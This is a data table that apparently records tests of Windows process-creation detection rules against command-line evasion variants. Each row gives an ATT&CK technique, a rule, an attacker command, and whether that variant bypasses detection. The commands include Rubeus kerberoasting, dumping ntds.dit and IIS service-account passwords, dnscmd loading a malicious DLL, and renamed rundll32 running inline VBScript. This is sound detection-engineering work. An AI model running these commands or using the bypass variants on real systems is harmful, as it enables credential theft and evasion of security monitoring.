Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9	"cmd.exe /c ""reg.exe add \""HKCU\Software\Microsoft\Office\16.0\Excel\Security\"" /v PythonFunctionWarnings /d 0 /f"""	"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v PythonFunctionWarnings /d 0 /f"	TRUE	FALSE	FALSE	Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9); Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9)
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9	"cmd.exe /c ""reg.exe add HKCU\Software\Microsoft\Office\16.0\Excel\Security /v PythonFunctionWarnings /t REG_DWORD /d 0 /f"""	reg.exe add HKCU\Software\Microsoft\Office\16.0\Excel\Security /v PythonFunctionWarnings /t REG_DWORD /d 0 /f	TRUE	FALSE	FALSE	Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9); Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9)
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9	"cmd.exe /c ""reg.exe add \""HKCU\Software\Microsoft\Office\16.0\Excel\Security\"" /v PythonFunctionWarnings /t REG_DWORD /d 0 /f"""	"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v PythonFunctionWarnings /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9); Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9)
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8	deviceenroller.exe  /PhoneDeepLink	deviceenroller.exe /PhoneDeepLink	TRUE	FALSE	FALSE	Potential DLL Sideloading Via DeviceEnroller.EXE (e173ad47-4388-4012-ae62-bd13f71c18a8)
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		deviceenroller.exe -PhoneDeepLink	TRUE	TRUE	TRUE	
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		"deviceenroller.exe /Phone""""DeepLink"	TRUE	TRUE	TRUE	
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		copy deviceenroller.exe not_an_enroller.exe && not_an_enroller.exe /PhoneDeepLink	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL malicious.dll	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /config /serverlevelplugindll malicious.dll	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		"dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL ""malicious.dll"""	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /SERVERLEVELPLUGINDLL malicious.dll /CONFIG	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL C:\malicious.dll	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL $env:TEMP\malicious.dll	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	"reg  query \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" /v CurrentBuildNumber"	"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber"	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	"reg  query \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" /v ProductName"	"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName"	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	"reg  query \""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation\"" /v TimeZoneKeyName"	"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName"	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell""}"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit""}"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	powershell.exe  Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'	powershell.exe Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		powershell.exe Invoke-Command -ScriptBlock { Start-Process 'cmd.exe' -ArgumentList '/c echo Success' }	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -w -n ""syscall:::return {lkd(0); exit(0);} """	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		dtrace.exe -w -n syscall:::return\ {lkd(0); exit(0);}	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		dtrace.exe -w -n 'syscall:::return {lkd(0); exit(0);}'	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		dtrace.exe -w -n syscall:::return {lkd(0); exit(0);}	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -n -w ""syscall:::return {lkd(0); exit(0);} """	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -w -n ""syscall:::return {lkd(0); exit(0);}"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe applicationsinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe  applications info	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe -applicationsinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe --applicationsinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe fileanalysis	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe  file analysis	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe -fileanalysis	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe --fileanalysis	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe servicesinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe  services info	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe -servicesinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe --servicesinfo	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe windowscreds	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe  windows creds	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe -windowscreds	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe --windowscreds	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f	REG    QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography   /v   MachineGuid	REG   QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography   /v   MachineGuid	TRUE	FALSE	FALSE	Suspicious Query of MachineGUID (f5240972-3938-4e56-8e4b-e33893176c1f)
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f	"REG   QUERY \""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\""  /v  MachineGuid"	"REG  QUERY ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography""  /v  MachineGuid"	TRUE	FALSE	FALSE	Suspicious Query of MachineGUID (f5240972-3938-4e56-8e4b-e33893176c1f)
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		REG   /v  MachineGuid  QUERY  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f	REG   QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  	REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  >  NUL	TRUE	FALSE	FALSE	Suspicious Query of MachineGUID (f5240972-3938-4e56-8e4b-e33893176c1f)
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f	REG   QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  	REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  |  findstr  MachineGuid	TRUE	FALSE	FALSE	Suspicious Query of MachineGUID (f5240972-3938-4e56-8e4b-e33893176c1f)
t1055	proc_creation_win_dllhost_no_cli_execution	Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9	dllhost.exe	dllhost.exe	TRUE	FALSE	FALSE	Dllhost.EXE Execution Anomaly (e7888eb1-13b0-4616-bd99-4bc0c2b054b9)
t1055	proc_creation_win_dllhost_no_cli_execution	Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9		"""dllhost.exe"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_dllhost_no_cli_execution	Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9		d l l h o s t . e x e	FALSE	FALSE	FALSE	
t1055	proc_creation_win_dllhost_no_cli_execution	Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9	dllhost.exe	cmd.exe /c dllhost.exe	TRUE	FALSE	FALSE	Dllhost.EXE Execution Anomaly (e7888eb1-13b0-4616-bd99-4bc0c2b054b9)
t1055	proc_creation_win_hktl_coercedpotato	HackTool - CoercedPotato Execution	e8d34729-86a4-4140-adfd-0a29c2106307		update_service.exe -e 1	FALSE	FALSE	FALSE	
t1055	proc_creation_win_hktl_dinjector	HackTool - DInjector PowerShell Cradle Execution	d78b5d61-187d-44b6-bf02-93486a80de5a		DInjector.exe /am51 /password:secret	FALSE	FALSE	FALSE	
t1055	proc_creation_win_hktl_dinjector	HackTool - DInjector PowerShell Cradle Execution	d78b5d61-187d-44b6-bf02-93486a80de5a		DInjector.exe /am^51 /password:secret	FALSE	FALSE	FALSE	
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd		"copy rundll32.exe updater.exe && updater.exe vbscript:""Execute(RegRead('...')); window.close;"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd		copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead('...')); window.close;	FALSE	FALSE	FALSE	
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd		"copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead(""..."")); window.close;"	FALSE	FALSE	FALSE	
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd		copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead('...'));window.close;	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *"	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		dsquery * -filter '(objectClass=trustedDomain)' -attr *	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		dsquery * -filter (objectClass=trustedDomain) -attr *	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		dsquery -attr * * -filter (objectClass=trustedDomain)	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		dsquery * -f (objectClass=trustedDomain) -attr *	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		dsquery * -filter (objectClass=trustedDomain) -a *	FALSE	FALSE	FALSE	
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""esentutl /p /d ntds.dit"""	esentutl /p /d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101)
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""esentutl.exe /p /d ntds.dit"""	esentutl.exe /p /d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101)
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""esentutl  /p   /d ntds.dit"""	esentutl  /p   /d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101)
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl ""/p"" /d ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""esentutl /p -d ntds.dit"""	esentutl /p -d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101)
t1003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""esentutl /p /d C:\path\to\ntds.dit"""	esentutl /p /d C:\path\to\ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101)
t1003	proc_creation_win_hktl_rubeus	HackTool - Rubeus Execution	7ec2c172-dceb-4c10-92c9-87c1881b7e18		not_malware.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt	FALSE	FALSE	FALSE	
t1003	proc_creation_win_hktl_rubeus	HackTool - Rubeus Execution	7ec2c172-dceb-4c10-92c9-87c1881b7e18		not_malware.exe asreproast /user:admin /format:hashcat	FALSE	FALSE	FALSE	
t1003	proc_creation_win_hktl_rubeus	HackTool - Rubeus Execution	7ec2c172-dceb-4c10-92c9-87c1881b7e18		not_malware.exe kerberoast /outfile:pass.txt	FALSE	FALSE	FALSE	
t1003	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		appcmd.exe list config /section:identity	FALSE	FALSE	FALSE	
t1003	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		appcmd.exe  list   config /section:identity	FALSE	FALSE	FALSE	
t1003	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		appcmd.exe list config -section:identity	FALSE	FALSE	FALSE	
t1003	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		appcmd.exe list config /section:identity /xml	FALSE	FALSE	FALSE	
t1003	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		appcmd.exe list config /section:identity /@t:password	FALSE	FALSE	FALSE	
